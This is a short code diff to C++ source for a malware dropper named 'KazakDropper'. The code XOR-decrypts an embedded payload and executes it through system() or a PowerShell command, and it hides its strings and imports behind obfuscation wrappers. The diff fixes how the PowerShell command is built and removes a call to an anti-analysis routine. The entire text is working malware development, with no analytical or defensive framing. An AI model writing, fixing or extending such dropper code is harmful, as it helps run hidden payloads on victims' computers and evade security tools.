@@ -121,13 +121,13 @@ void KazakDropper::PreparePayload()
 	for (int x = 0; x < 10; x++)
 		S.DecryptedPayload[x] = S.EncryptedPayload[x] ^ S.XorKey[x];
 
-
-
 }
 
 void KazakDropper::DropPayload(std::string payload)
 {
 	Storage S;
+	std::string PowerShellCommand = enc("powershell ") + payload;
+
 	if (!payload.find(enc("powershell")))
 		S.CmdPayload = true;
 	else
@@ -136,7 +136,7 @@ void KazakDropper::DropPayload(std::string payload)
 	if (S.CmdPayload)
 		li(system)(payload.c_str());
 	else
-		li(system)(enc("powershell") + payload);
+		li(system)(PowerShellCommand.c_str());
 
 }
 
@@ -158,9 +158,6 @@ int main()
 		exit(-1);
 
 	}
-
-	if (KazakDropper::EvadeAnalysis())
-		return 0;
 
 	return 0;
 
